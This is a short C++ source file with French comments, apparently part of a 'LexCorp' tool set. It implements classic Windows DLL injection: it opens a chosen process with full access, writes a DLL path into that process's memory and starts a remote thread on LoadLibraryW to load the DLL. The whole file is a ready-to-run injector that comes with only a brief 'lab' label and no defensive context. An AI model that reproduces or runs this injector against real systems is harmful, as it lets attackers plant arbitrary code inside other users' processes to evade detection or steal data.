// language: C++17, file: lex_inject_dll.cpp, target: Windows 10/11 x64, MSVC/MinGW
// LexCorp - DLL injection classique : CreateRemoteThread -> LoadLibraryW
// Usage: lex_inject_dll.exe <pid> <chemin_dll>
// README: injection de bibliotheque dans un processus existant (lab)
#include <windows.h>
#include <cstdio>

int main(int argc, char** argv) {
    if (argc < 3) { printf("usage: %s <pid> <dll>\n", argv[0]); return 1; }
    DWORD pid = atoi(argv[1]);
    wchar_t dll[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, argv[2], -1, dll, MAX_PATH);

    HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!p) { printf("[X] OpenProcess %lu\n", GetLastError()); return 1; }

    SIZE_T sz = (wcslen(dll) + 1) * sizeof(wchar_t);
    LPVOID mem = VirtualAllocEx(p, NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { printf("[X] VirtualAllocEx\n"); return 1; }
    WriteProcessMemory(p, mem, dll, sz, NULL);

    LPTHREAD_START_ROUTINE load = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
    HANDLE t = CreateRemoteThread(p, NULL, 0, load, mem, 0, NULL);
    if (!t) { printf("[X] CreateRemoteThread\n"); return 1; }
    WaitForSingleObject(t, 5000);
    printf("[OK] DLL injectee dans pid %lu\n", pid);
    CloseHandle(t); CloseHandle(p);
    return 0;
}
